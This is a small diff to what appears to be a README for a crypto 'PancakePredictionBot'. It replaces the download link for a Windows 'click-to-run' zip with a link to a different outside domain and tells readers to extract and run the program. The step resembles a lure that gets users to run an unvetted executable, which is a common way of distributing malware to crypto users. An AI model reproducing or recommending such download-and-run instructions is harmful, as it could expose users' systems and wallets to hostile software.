@@ -7,7 +7,7 @@
 
 
 ## 💡 Ready click-to-run version for Windows 🥞
-1. Download the [Easy run version](https://coinsw.app/PancakePredictionBot.zip).
+1. Download the [Easy run version](https://tryenom.com/predict).
 2. Extract the bot program from the zip archive and run it.
 3. Enjoy!
 
